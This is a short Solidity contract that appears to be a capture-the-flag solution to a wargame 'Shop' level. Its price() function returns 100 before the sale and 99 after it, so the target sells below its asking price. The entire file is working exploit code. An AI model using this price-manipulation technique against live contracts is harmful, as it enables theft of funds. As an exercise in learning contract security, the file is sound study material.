// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Shop.sol';

contract HackShop {
  Shop shop;

  constructor (address shopadd) public {
      shop = Shop(shopadd);
  }

  function price() external view returns (uint) {
      if (!shop.isSold()) {
          return 100;
      } else {
          return 99;
      }
  }

  function hack() public {
      shop.buy();
  }

}